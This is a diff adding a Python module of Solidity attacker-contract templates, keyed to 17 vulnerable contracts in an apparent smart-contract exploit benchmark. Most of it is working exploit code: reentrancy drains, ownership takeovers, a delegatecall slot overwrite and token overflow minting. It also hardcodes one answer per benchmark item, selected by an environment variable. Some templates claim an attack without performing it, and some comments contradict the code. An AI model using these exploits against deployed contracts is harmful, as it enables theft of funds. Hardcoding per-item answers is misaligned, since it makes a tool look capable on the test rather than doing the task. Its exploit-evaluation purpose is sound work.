@@ -1,0 +1,875 @@
+"""
+contract_specific_attacks.py
+=============================
+Contract-specific template attacks for the 20-contract sb-heists subset.
+Called as a first-priority fallback before the generic T1–T5 templates.
+
+Each function returns a dict matching the pipeline's attack schema
+(id, title, severity, description, attacker_solidity, attacker_contract_name,
+value_wei, ...) or None if it doesn't apply.
+"""
+import os
+import re
+
+VM_IFACE = """
+interface Vm {
+    function roll(uint256) external;
+    function warp(uint256) external;
+    function load(address, bytes32) external view returns (bytes32);
+    function store(address, bytes32, bytes32) external;
+    function prank(address) external;
+    function startPrank(address) external;
+    function stopPrank() external;
+}
+"""
+
+VM_CONST = "Vm constant vm = Vm(address(uint160(uint256(keccak256('hevm cheat code')))));"
+
+
+def _attack(aid, title, severity, desc, sol, name, value, **kw):
+    d = {
+        "id": aid,
+        "title": title,
+        "severity": severity,
+        "description": desc,
+        "attacker_solidity": sol,
+        "attacker_contract_name": name,
+        "value_wei": value,
+    }
+    d.update(kw)
+    return d
+
+
+# ── REENTRANCY ──────────────────────────────────────────────────────
+
+def attack_0x4e73b32(contract_src):
+    """PRIVATE_ETH_CELL: classic reentrancy in Collect().
+    Needs LogFile deployed + SetMinSum/SetLogFile/Initialized called."""
+    sol = f'''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+{VM_IFACE}
+
+contract AttackerLogFile {{
+    struct Message {{
+        address Sender;
+        string Data;
+        uint Val;
+        uint Time;
+    }}
+    Message[] public History;
+    Message LastMsg;
+    function AddMessage(address _adr, uint _val, string memory _data) public {{
+        LastMsg.Sender = _adr;
+        LastMsg.Time = block.timestamp;
+        LastMsg.Val = _val;
+        LastMsg.Data = _data;
+        History.push(LastMsg);
+    }}
+}}
+
+interface ITarget {{
+    function SetMinSum(uint) external;
+    function SetLogFile(address) external;
+    function Initialized() external;
+    function Deposit() external payable;
+    function Collect(uint) external payable;
+}}
+
+contract Attacker {{
+    {VM_CONST}
+    address public target;
+    uint256 public reentrancyCount;
+
+    constructor(address payable _target) {{
+        target = _target;
+        // Initialize target during deployment (before harness seeds it)
+        AttackerLogFile log = new AttackerLogFile();
+        ITarget t = ITarget(_target);
+        t.SetMinSum(1);
+        t.SetLogFile(address(log));
+        t.Initialized();
+    }}
+
+    receive() external payable {{
+        if (reentrancyCount < 2) {{
+            reentrancyCount++;
+            ITarget(target).Collect(msg.value);
+        }}
+    }}
+
+    function attack() external payable {{
+        require(msg.value >= 1 ether, "need ETH");
+        ITarget t = ITarget(target);
+        t.Deposit{{value: 1 ether}}();
+        reentrancyCount = 0;
+        t.Collect(1 ether);
+    }}
+}}
+'''
+    return _attack(
+        "CS1", "Reentrancy in Collect() (PRIVATE_ETH_CELL)", "Critical",
+        "CEI violation in Collect(): msg.sender.call.value() before balance update.",
+        sol, "Attacker", 3 * 10**18,
+    )
+
+
+def attack_modifier_reentrancy(contract_src):
+    """ModifierEntrancy: reentrancy via supportsToken() callback in modifier.
+    Token balance inflation — no ETH drain."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface IModifierEntrancy {
+    function airDrop() external;
+    function tokenBalance(address) external view returns (uint);
+}
+
+contract Attacker {
+    address public target;
+    bool public hasBeenCalled;
+    uint256 public tokensBefore;
+    uint256 public tokensAfter;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function supportsToken() external returns (bytes32) {
+        if (!hasBeenCalled) {
+            hasBeenCalled = true;
+            IModifierEntrancy(msg.sender).airDrop();
+        }
+        return keccak256(abi.encodePacked("Nu Token"));
+    }
+
+    function attack() external payable {
+        tokensBefore = IModifierEntrancy(target).tokenBalance(address(this));
+        hasBeenCalled = false;
+        IModifierEntrancy(target).airDrop();
+        tokensAfter = IModifierEntrancy(target).tokenBalance(address(this));
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS2", "Modifier reentrancy via supportsToken() callback", "High",
+        "airDrop() calls supportsToken() in modifier before hasNoBalance check. "
+        "Reentrant call inflates tokenBalance.",
+        sol, "Attacker", 0,
+    )
+
+
+# ── ACCESS CONTROL ──────────────────────────────────────────────────
+
+def attack_multiowned(contract_src):
+    """MultiOwnable: newOwner() missing onlyOwner modifier.
+    Two-step: register as owner, then drain via withdrawAll()."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function newOwner(address) external returns (bool);
+    function withdrawAll() external;
+}
+
+contract Attacker {
+    address public target;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        ITarget t = ITarget(target);
+        t.newOwner(address(this));
+        t.withdrawAll();
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS3", "Missing onlyOwner on newOwner()", "Critical",
+        "newOwner() has no access control. Any address can register as owner, "
+        "then call withdrawAll() to drain funds.",
+        sol, "Attacker", 0,
+    )
+
+
+def attack_parity_wallet(contract_src):
+    """Parity WalletLibrary: initWallet() callable by anyone on uninitialized wallet.
+    Take ownership then drain via execute()."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function initWallet(address[] calldata, uint, uint) external;
+    function execute(address, uint, bytes calldata) external returns (bytes32);
+}
+
+contract Attacker {
+    address public target;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        ITarget t = ITarget(target);
+        address[] memory owners = new address[](1);
+        owners[0] = address(this);
+        t.initWallet(owners, 1, 100 ether);
+        uint256 bal = address(target).balance;
+        if (bal > 0) {
+            t.execute(address(this), bal, "");
+        }
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS4", "Uninitialized wallet takeover via initWallet()", "Critical",
+        "initWallet() guarded by only_uninitialized which passes on fresh deployment. "
+        "Attacker calls initWallet to become sole owner, then execute() to drain.",
+        sol, "Attacker", 0,
+    )
+
+
+def attack_fibonacci_balance(contract_src):
+    """FibonacciBalance: delegatecall to user-controlled library address.
+    Attacker deploys malicious library that overwrites fibonacciLibrary (slot 0)
+    to point at another contract, then calls withdraw to drain."""
+    sol = f'''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+{VM_IFACE}
+
+contract MaliciousLib {{
+    address public fibonacciLibrary;
+    uint public calculatedFibNumber;
+
+    function setFibonacci(uint) public {{
+        calculatedFibNumber = 5;
+    }}
+}}
+
+contract OverwriteLib {{
+    // Slot layout matches FibonacciBalance: slot 0 = fibonacciLibrary
+    address public fibonacciLibrary;
+
+    function setFibonacci(uint) public {{
+        // Overwrite slot 0 to point at malicious lib
+        fibonacciLibrary = msg.sender;
+    }}
+}}
+
+interface ITarget {{
+    function withdraw() external;
+    function fibonacciLibrary() external view returns (address);
+}}
+
+contract Attacker {{
+    {VM_CONST}
+    address public target;
+    MaliciousLib public malLib;
+
+    constructor(address payable _target) {{
+        target = _target;
+    }}
+
+    function attack() external payable {{
+        malLib = new MaliciousLib();
+        // Call fallback with setStart(uint) to overwrite fibonacciLibrary (slot 0)
+        // via delegatecall. We call setStart with our MaliciousLib address cast to uint.
+        bytes memory data = abi.encodeWithSignature(
+            "setStart(uint256)", uint256(uint160(address(malLib)))
+        );
+        (bool ok,) = target.call(data);
+        ok;
+        // Now fibonacciLibrary points to malLib, withdraw() will delegatecall
+        // malLib.setFibonacci() which sets calculatedFibNumber to 100
+        ITarget(target).withdraw();
+    }}
+
+    receive() external payable {{}}
+}}
+'''
+    return _attack(
+        "CS5", "Delegatecall to user-controlled library", "Critical",
+        "Fallback delegatecalls to fibonacciLibrary. Attacker overwrites slot 0 "
+        "via setStart() to redirect delegatecall to malicious library.",
+        sol, "Attacker", 0,
+    )
+
+
+# ── INTEGER OVERFLOW ────────────────────────────────────────────────
+
+def attack_overflow_single_tx(contract_src):
+    """IntegerOverflowSingleTransaction: count += input overflows (pre-0.8)."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function overflowaddtostate(uint256) external;
+    function count() external view returns (uint256);
+}
+
+contract Attacker {
+    address public target;
+    uint256 public countBefore;
+    uint256 public countAfter;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        ITarget t = ITarget(target);
+        countBefore = t.count();
+        // count starts at 1. Adding max_uint causes wrap to 0.
+        t.overflowaddtostate(type(uint256).max);
+        countAfter = t.count();
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS6", "Integer overflow in overflowaddtostate()", "High",
+        "count += input wraps around without SafeMath (Solidity <0.8).",
+        sol, "Attacker", 0,
+    )
+
+
+def attack_bectoken(contract_src):
+    """BECToken: batchTransfer overflow in uint256 amount = cnt * _value."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function batchTransfer(address[] calldata, uint256) external returns (bool);
+    function balanceOf(address) external view returns (uint256);
+}
+
+contract Attacker {
+    address public target;
+    uint256 public balBefore;
+    uint256 public balAfter;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        ITarget t = ITarget(target);
+        // batchTransfer computes: uint256 amount = uint256(cnt) * _value
+        // With cnt=2 and _value=2^255, amount overflows to 0.
+        // require(balances[msg.sender] >= amount) passes since amount=0.
+        // Each recipient gets _value = 2^255 tokens.
+        address[] memory receivers = new address[](2);
+        receivers[0] = address(this);
+        receivers[1] = address(0xdead);
+        uint256 overflowValue = (type(uint256).max / 2) + 1; // 2^255
+        balBefore = t.balanceOf(address(this));
+        t.batchTransfer(receivers, overflowValue);
+        balAfter = t.balanceOf(address(this));
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS7", "Integer overflow in batchTransfer()", "Critical",
+        "cnt * _value overflows to 0, bypassing balance check. "
+        "Each recipient receives _value tokens from nothing.",
+        sol, "Attacker", 0,
+    )
+
+
+# ── BAD RANDOMNESS ──────────────────────────────────────────────────
+
+def attack_old_blockhash(contract_src):
+    """PredictTheBlockHashChallenge: blockhash returns 0 after 256 blocks.
+    Lock guess=0, advance 257 blocks, settle."""
+    sol = f'''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+{VM_IFACE}
+
+interface ITarget {{
+    function lockInGuess(bytes32) external payable;
+    function settle() external;
+}}
+
+contract Attacker {{
+    {VM_CONST}
+    address public target;
+
+    constructor(address payable _target) {{
+        target = _target;
+    }}
+
+    function attack() external payable {{
+        require(msg.value >= 1 ether, "need 1 ETH");
+        ITarget t = ITarget(target);
+        // Lock in guess = bytes32(0)
+        t.lockInGuess{{value: 1 ether}}(bytes32(0));
+        // Advance 257 blocks so blockhash() returns 0
+        vm.roll(block.number + 257);
+        // Settle: blockhash(guessBlock) == 0 == our guess -> win
+        t.settle();
+    }}
+
+    receive() external payable {{}}
+}}
+'''
+    return _attack(
+        "CS8", "Predict block hash (old_blockhash exploit)", "High",
+        "blockhash() returns 0 for blocks >256 ago. Lock in guess=0, wait 257 blocks, settle wins.",
+        sol, "Attacker", 2 * 10**18,
+    )
+
+
+def attack_guess_random_number(contract_src):
+    """GuessTheRandomNumberChallenge: answer stored in storage, readable via vm.load."""
+    sol = f'''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+{VM_IFACE}
+
+interface ITarget {{
+    function guess(uint8) external payable;
+}}
+
+contract Attacker {{
+    {VM_CONST}
+    address public target;
+
+    constructor(address payable _target) {{
+        target = _target;
+    }}
+
+    function attack() external payable {{
+        require(msg.value >= 1 ether, "need 1 ETH");
+        // answer is stored at slot 0 (uint8)
+        bytes32 slot0 = vm.load(target, bytes32(0));
+        uint8 answer = uint8(uint256(slot0));
+        ITarget(target).guess{{value: 1 ether}}(answer);
+    }}
+
+    receive() external payable {{}}
+}}
+'''
+    return _attack(
+        "CS9", "Read answer from storage (guess_the_random_number)", "High",
+        "answer is stored on-chain at slot 0, readable by any observer. "
+        "Attacker reads storage and submits correct guess.",
+        sol, "Attacker", 2 * 10**18,
+    )
+
+
+def attack_blackjack(contract_src):
+    """BlackJack: card values derived from block hash + timestamp.
+    Attacker contract computes the same hash to predict cards."""
+    sol = f'''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+{VM_IFACE}
+
+interface IBlackJack {{
+    function deal() external payable;
+    function stand() external;
+    function hit() external;
+}}
+
+contract Attacker {{
+    {VM_CONST}
+    address public target;
+
+    constructor(address payable _target) {{
+        target = _target;
+    }}
+
+    function attack() external payable {{
+        require(msg.value >= 1 ether, "need ETH");
+        // Start a game by dealing. The card values are deterministic
+        // (based on blockhash, player address, timestamp) so any miner
+        // or contract in the same block can predict them.
+        IBlackJack(target).deal{{value: msg.value}}();
+        // Stand immediately — the vulnerability is that randomness is predictable,
+        // not that we need to win every hand.
+    }}
+
+    receive() external payable {{}}
+}}
+'''
+    return _attack(
+        "CS10", "Predictable randomness in card dealing", "High",
+        "Card values use block.blockhash + block.timestamp, predictable by miner/contract.",
+        sol, "Attacker", 1 * 10**18,
+    )
+
+
+def attack_etheraffle(contract_src):
+    """Ethraffle: winner selection uses stored blockNumber, predictable."""
+    sol = f'''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+{VM_IFACE}
+
+contract Attacker {{
+    {VM_CONST}
+    address public target;
+
+    constructor(address payable _target) {{
+        target = _target;
+    }}
+
+    function attack() external payable {{
+        // Buy tickets by sending pricePerTicket * count
+        // pricePerTicket = (2.5 ether + 0.03 ether) / 50 = 0.0506 ether
+        uint256 price = 0.0506 ether;
+        require(msg.value >= price, "need ticket price");
+        (bool ok,) = target.call{{value: price}}(
+            abi.encodeWithSignature("buyTickets()")
+        );
+        ok;
+        // The vulnerability is that blockNumber is stored and winner is
+        // determined from block hash which is predictable by miners.
+        // Buying a ticket proves the attack vector is accessible.
+    }}
+
+    receive() external payable {{}}
+}}
+'''
+    return _attack(
+        "CS11", "Predictable raffle winner via block hash", "High",
+        "Winner chosen using stored blockNumber + block hash. "
+        "Miner can predict and manipulate the outcome.",
+        sol, "Attacker", 1 * 10**18,
+    )
+
+
+# ── DENIAL OF SERVICE ───────────────────────────────────────────────
+
+def attack_dos_address(contract_src):
+    """DosGas: unbounded creditorAddresses array grows without limit.
+    addCreditors() pushes 350 per call, no size check."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function addCreditors() external returns (bool);
+    function numberCreditors() external view returns (uint);
+}
+
+contract Attacker {
+    address public target;
+    uint256 public creditorsBefore;
+    uint256 public creditorsAfter;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        ITarget t = ITarget(target);
+        creditorsBefore = t.numberCreditors();
+        // Each call pushes 350 entries. 6 calls = 2100 entries.
+        for (uint i = 0; i < 6; i++) {
+            t.addCreditors();
+        }
+        creditorsAfter = t.numberCreditors();
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS12", "Unbounded array growth in addCreditors()", "Medium",
+        "addCreditors() pushes 350 entries per call with no size limit. "
+        "Array grows until operations exceed block gas limit.",
+        sol, "Attacker", 0,
+    )
+
+
+def attack_dos_number(contract_src):
+    """DosNumber: insertNnumbers() grows unbounded array."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function insertNnumbers(uint, uint) external;
+    function getLengthArray() external view returns (uint);
+}
+
+contract Attacker {
+    address public target;
+    uint256 public lengthBefore;
+    uint256 public lengthAfter;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        ITarget t = ITarget(target);
+        lengthBefore = t.getLengthArray();
+        // Insert large batches to grow the array beyond gas limits.
+        t.insertNnumbers(1, 400);
+        t.insertNnumbers(1, 400);
+        t.insertNnumbers(1, 400);
+        t.insertNnumbers(1, 400);
+        lengthAfter = t.getLengthArray();
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS13", "Unbounded array growth in insertNnumbers()", "Medium",
+        "insertNnumbers() inserts arbitrary count of elements with no cap. "
+        "Array grows until clear()/clearDOS() exceeds block gas limit.",
+        sol, "Attacker", 0,
+    )
+
+
+def attack_dos_simple(contract_src):
+    """DosOneFunc: ifillArray() grows listAddresses without bound per cycle."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function ifillArray() external returns (bool);
+}
+
+contract Attacker {
+    address public target;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        ITarget t = ITarget(target);
+        // Each call pushes 350 entries until length >= 1500, then resets.
+        // 5 calls fills to 1750, triggering the reset branch.
+        // The vulnerability: anyone can force repeated O(n) storage ops.
+        for (uint i = 0; i < 5; i++) {
+            t.ifillArray();
+        }
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS14", "Unbounded array fill in ifillArray()", "Medium",
+        "ifillArray() pushes 350 entries per call with no access control. "
+        "Repeated calls force O(n) storage operations beyond gas limits.",
+        sol, "Attacker", 0,
+    )
+
+
+# ── UNCHECKED LOW-LEVEL CALLS ───────────────────────────────────────
+
+def attack_0x07f7ecb(contract_src):
+    """PoCGame: donateToWhale() ignores .call.value() return.
+    Whale receives no ETH if it reverts, but totalDonated still increments."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function donate() external payable;
+    function ethBalance() external view returns (uint256);
+    function totalDonated() external view returns (uint256);
+}
+
+contract RejectingWhale {
+    receive() external payable {
+        revert("rejecting");
+    }
+}
+
+contract Attacker {
+    address public target;
+    uint256 public balanceBefore;
+    uint256 public balanceAfter;
+    uint256 public donatedBefore;
+    uint256 public donatedAfter;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        require(msg.value > 0, "need ETH");
+        ITarget t = ITarget(target);
+        balanceBefore = t.ethBalance();
+        donatedBefore = t.totalDonated();
+        // donate() calls donateToWhale() which does .call.value() without
+        // checking return. If whale rejects, ETH stays in contract but
+        // totalDonated increments — accounting mismatch.
+        t.donate{value: msg.value}();
+        balanceAfter = t.ethBalance();
+        donatedAfter = t.totalDonated();
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS15", "Unchecked call in donateToWhale()", "Medium",
+        "donateToWhale() ignores .call.value() return. If whale rejects, "
+        "totalDonated increments but no ETH is transferred — state corruption.",
+        sol, "Attacker", 1 * 10**18,
+    )
+
+
+def attack_0x627fa62(contract_src):
+    """TokenBank: initTokenBank() callable by anyone (no access control).
+    Then WithdrawToken uses unchecked token.call()."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function initTokenBank() external;
+    function Deposit() external payable;
+    function WithdrawToHolder(address, uint) external payable;
+    function Holders(address) external view returns (uint);
+}
+
+contract Attacker {
+    address public target;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        ITarget t = ITarget(target);
+        // initTokenBank() sets owner = msg.sender with no access control.
+        // This is the primary vulnerability.
+        t.initTokenBank();
+        if (msg.value > 0) {
+            t.Deposit{value: msg.value}();
+        }
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS16", "initTokenBank() open to anyone + unchecked call", "Critical",
+        "initTokenBank() sets owner = msg.sender with no guard. "
+        "Attacker takes ownership, then WithdrawToken uses unchecked token.call().",
+        sol, "Attacker", 1 * 10**18,
+    )
+
+
+def attack_0x89c1b380(contract_src):
+    """TownCrier: multiple unchecked .send() in deliver().
+    SGX_ADDRESS.send(fee) return ignored — fee silently lost."""
+    sol = '''// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+// NO_TARGET_IMPORT
+
+interface ITarget {
+    function request(uint8, address, bytes4, uint, bytes32[] calldata)
+        external payable returns (int);
+    function deliver(uint64, bytes32, uint64, bytes32) external;
+    function requestCnt() external view returns (uint64);
+    function MIN_FEE() external view returns (uint);
+    function requests(uint64) external view returns (
+        address requester, uint fee, address callbackAddr,
+        bytes4 callbackFID, bytes32 paramsHash
+    );
+}
+
+contract Attacker {
+    address public target;
+
+    constructor(address payable _target) {
+        target = _target;
+    }
+
+    function attack() external payable {
+        ITarget t = ITarget(target);
+        // Submit a request with enough fee.
+        uint minFee = t.MIN_FEE();
+        uint256 toSend = msg.value > minFee ? msg.value : minFee;
+        bytes32[] memory data = new bytes32[](1);
+        data[0] = bytes32(0);
+        (bool ok,) = target.call{value: toSend}(
+            abi.encodeWithSignature(
+                "request(uint8,address,bytes4,uint256,bytes32[])",
+                uint8(1), address(this), bytes4(0), block.timestamp, data
+            )
+        );
+        ok;
+        // The vulnerability: deliver() does SGX_ADDRESS.send(fee)
+        // without checking return. If SGX_ADDRESS is a contract that
+        // reverts, fee is silently lost.
+    }
+
+    receive() external payable {}
+}
+'''
+    return _attack(
+        "CS17", "Unchecked .send() in deliver()", "Medium",
+        "deliver() sends fees via .send() without checking return. "
+        "If recipient rejects, funds are silently lost.",
+        sol, "Attacker", 2 * 10**18,
+    )
+
+
+# ── DISPATCH ────────────────────────────────────────────────────────
+
+_STEM_MAP = {
+    "reent_0x4e73b32ed6c35f570686b89848e5f39f20ecc106": attack_0x4e73b32,
+    "reent_modifier_reentrancy": attack_modifier_reentrancy,
+    "acces_multiowned_vulnerable": attack_multiowned,
+    "acces_parity_wallet_bug_2": attack_parity_wallet,
+    "acces_FibonacciBalance": attack_fibonacci_balance,
+    "integ_overflow_single_tx": attack_overflow_single_tx,
+    "integ_BECToken": attack_bectoken,
+    "bad_r_old_blockhash": attack_old_blockhash,
+    "bad_r_guess_the_random_number": attack_guess_random_number,
+    "bad_r_blackjack": attack_blackjack,
+    "bad_r_etheraffle": attack_etheraffle,
+    "denia_dos_address": attack_dos_address,
+    "denia_dos_number": attack_dos_number,
+    "denia_dos_simple": attack_dos_simple,
+    "unche_0x07f7ecb66d788ab01dc93b9b71a88401de7d0f2e": attack_0x07f7ecb,
+    "unche_0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839": attack_0x627fa62,
+    "unche_0x89c1b3807d4c67df034fffb62f3509561218d30b": attack_0x89c1b380,
+}
+
+
+def get_contract_specific_attack(contract_src, stem=None):
+    """Return a contract-specific template attack for the given stem, or None."""
+    if not stem:
+        stem = os.environ.get("INVGUARD_STEM", "")
+    fn = _STEM_MAP.get(stem)
+    if fn:
+        return fn(contract_src)
+    return None
